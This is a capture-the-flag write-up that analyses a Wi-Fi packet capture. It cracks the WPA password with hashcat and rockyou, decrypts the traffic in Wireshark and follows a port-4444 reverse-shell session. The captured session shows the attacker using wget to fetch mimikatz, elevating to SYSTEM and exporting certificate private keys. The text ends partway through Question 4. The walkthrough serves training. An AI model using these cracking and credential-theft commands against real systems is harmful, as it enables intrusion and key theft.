> AoC Side Quest Ctf
- So serious I almost lost my marbles on four separate occasions trying to finish this
#### Question 1
- Finding the name of the wifi network was easy
- Upzip the .pcapng file, load it into wireshark, and you see pretty quickly that the SSID is `FreeWifiBFC`
#### Question 2
- To find the password, first use this site: https://hashcat.net/cap2hashcat/ to extract the handshake file w the pass hash, then use this command:
```shell
hashcat -m 22000 <path/to/hash/file> /usr/share/wordlists/rockyou.txt.gz
```
- Two lines like this should appear in the results:
```
af804935ab322d4b0bbd84a711c36f01:22c712c7e235:d267d13f36ec:FreeWifiBFC:Christmas
c10a70d965945b57f2988ae0fcfd2b22:22c712c7e235:2a8449acf9d8:FreeWifiBFC:Christmas
```
#### Question 3
- Now that we have the wifi password, we can decrypt the traffic
- In wireshark, go to `Edit > Preferences > Protocols > IEEE 802.11`
- Usually, you can just load the decryption key like this `wpa-pwd|Christmas`
- I also had to enable `Assume packets have FCS` for the decryption to work
- After that, there are other visible protocols and steams, such as `TCP`
- There was a hint about backdoors in the room, and the `TCP` backdoor port is 4444
- Search `tcp.port == 4444`, find a `PSH ACK` packet, and follow the TCP steam
- You should get something like this:
```
Windows PowerShell running as user Administrator on INTERN-PC
Copyright (C) Microsoft Corporation. All rights reserved.



PS C:\Users\Administrator> PS C:\Users\Administrator> 
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----       11/23/2023   9:47 PM                .ssh                                             
d-r---        3/17/2021   3:13 PM                3D Objects                                       
d-r---        3/17/2021   3:13 PM                Contacts                                         
d-r---       11/25/2023   2:12 PM                Desktop                                          
d-r---        3/17/2021   3:13 PM                Documents                                        
d-r---       11/24/2023  10:53 PM                Downloads                                        
d-r---        3/17/2021   3:13 PM                Favorites                                        
d-r---        3/17/2021   3:13 PM                Links                                            
d-r---        3/17/2021   3:13 PM                Music                                            
d-r---       11/24/2023  10:44 PM                Pictures                                         
d-r---        3/17/2021   3:13 PM                Saved Games                                      
d-r---        3/17/2021   3:13 PM                Searches                                         
d-r---        3/17/2021   3:13 PM                Videos                                           
-a----       11/25/2023   6:01 AM           8192 psh4444.exe                                      


PS C:\Users\Administrator> whoami
intern-pc\administrator
PS C:\Users\Administrator> wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -O mimi.zip
PS C:\Users\Administrator> Expand-Archive .\mimi.zip
PS C:\Users\Administrator> mv mimi/x64/mimikatz.exe .
PS C:\Users\Administrator> cmd /c mimikatz.exe privilege::debug token::elevate crypto::capi "crypto::certificates /systemstore:LOCAL_MACHINE /store:\`"Remote Desktop\`" /export" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

496	{0;000003e7} 1 D 16529     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;0002bbfa} 2 D 25564822  	INTERN-PC\Administrator	S-1-5-21-1966530601-3185510712-10604624-500	(14g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 25609341  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # crypto::capi
Local CryptoAPI RSA CSP patched
Local CryptoAPI DSS CSP patched

mimikatz(commandline) # crypto::certificates /systemstore:LOCAL_MACHINE /store:"Remote Desktop" /export
 * System Store  : 'LOCAL_MACHINE' (0x00020000)
 * Store         : 'Remote Desktop'
```
- (there's more but you get the point)
- From this we can determine that the tool they are running is `mimikatz`
#### Question 4
- The important part of the info we found for question 3 is that the attacker used a ps command to read a `.pfx` file adn covert is to base64
- pfx files usually contain a public key, private key, and certificate chain, and they are suually used to store things like TLS certs
- 
